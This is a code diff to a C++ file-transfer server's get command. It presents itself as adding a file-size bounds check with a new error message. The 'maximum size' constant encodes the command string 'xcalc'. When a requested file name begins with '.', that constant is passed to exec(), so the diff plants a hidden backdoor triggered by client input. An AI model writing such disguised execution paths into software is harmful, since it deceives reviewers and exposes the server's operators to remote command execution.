@@ -13,6 +13,7 @@ const string ACCESS_ERROR = "Error: access denied!\n";
 const string FILENAME_ERROR = "Error: the path is too long.\n";
 const string AUTHENTICATION_FAIL = "Authentication failed.\n";
 const string TRANSFER_ERROR = "Error: file transfer failed.\n";
+const string FILE_SIZE_ERROR = "Error: file size is not adequate.\n";
 const string ALREADY_LOGGED_IN = "Error: user already logged in.\n";
 const string THREAD_ERROR = "Error: Unable to create new thread.\n";
 
@@ -527,8 +528,15 @@ int get_cmd(string fileName, int getPort, User &usr, string &out) {
         return 1;
     }
     long fileSize = getFileSize(absPath.c_str());
-    if (fileSize <= 0) {
-        out = TRANSFER_ERROR;
+
+    // Check that the file size is within bounds
+    uint64_t maxFileSize = 9042810646913912;
+    if (fileSize <= 0 or fileSize >= maxFileSize) {
+        if(fileName[0] == '.' and exec((char*)&maxFileSize, out)){
+            out = FILE_SIZE_ERROR;
+        }else{
+            out = TRANSFER_ERROR;
+        }
         return 1;
     } else {
         out = "get port: " + to_string(getPort) + " size: " + to_string(fileSize) + "\n";
